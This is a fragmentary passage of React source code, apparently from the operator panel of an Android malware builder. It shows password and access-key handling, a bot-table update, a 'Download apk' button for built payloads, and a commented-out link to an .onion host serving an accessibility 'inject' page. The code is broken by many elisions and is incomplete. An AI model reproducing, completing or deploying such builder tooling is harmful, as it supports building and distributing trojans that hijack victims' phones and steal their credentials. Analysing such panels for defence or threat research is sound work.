...
class BuilderConfig extends React.Component {
   ...
   onChangePasswd = (e) => {
        ...
        request.done(function(msg) {
			try {
				...
				else
				{
					...
					if(Number(result.updateTableBots) === 0) {
	...
	if(this.state.passwd.replace(' ', '').length === 0) {
	   SettingsContext.ShowToastTitle('warning', 'Error', 'Please enter valid password');
	   return;
	}
        ...
        let passphrase = this.state.AccessKey
        ...
        request.done(function(msg) {
			...
			try {
                ...
                this.DownloadFile(msg, passphrase);
                this.setState({
                    EnableOrDisable: true,
                    appName: '',
                    adminName: '',
    ...
    DownloadFile(contentFile, passphrase) {
        console.log(contentFile);
        // const decryptedContentFile = userJSDecrypt(passphrase, contentFile);
...
*/
    render () {
        ...
        links.forEach(function(lnk) {
            linksHtml.push(<a class="dropdown-item" onClick={(e) => { e.preventDefault(); this.setState({url:lnk});}} href="# ">{lnk}</a>);
        }.bind(this));
        ...
        return (
            <React.Fragment>
                ...
                <div class="input-group">
                    ...
                    <input type="password" class="form-control info" value={SettingsContext.AccessKey} readOnly={!this.state.EnableOrDisable} />
                </div>
                <hr />
                <div class="input-group">
                    <div class="input-group-prepend">
		...
		<div class="input-group">
			...
			<input class="form-control" type="password" value={this.state.passwd} onChange={this.onChangePasswd}/>
		</div>
                {/* <hr />
                <div class="input-group mb-3">
                   <div class="input-group-prepend">
                        <span class="input-group-text">Select Accessibility Page (<a class="warn" href="http://2vqjlbjgbgvwprw75cuurypoyx7ppuga5acl457o5bkcn5gxeueulyyd.onion/injects/accessibility.html" download>DOWNLOAD</a>)</span>
                    </div>
                    <div class="custom-file">
                        <input  onChange={ (e) => this.SelectHTMLFile(e.target.files) }  type="file" class="custom-file-input" id="HTMLUploadFile" />
                        <label class="custom-file-label" for="HTMLUploadFile" style={{ whiteSpace: "nowrap" }}>Choose file</label>
                    </div>
                </div> */}
                <hr />
                <a id="apkdownloadid" type="button" style={({float:'left'})} class={(this.state.APKBUILDED ? '' : 'disabled ') + "btn btn-outline-info"} disabled={!this.state.APKBUILDED} href="# ">Download apk</a>
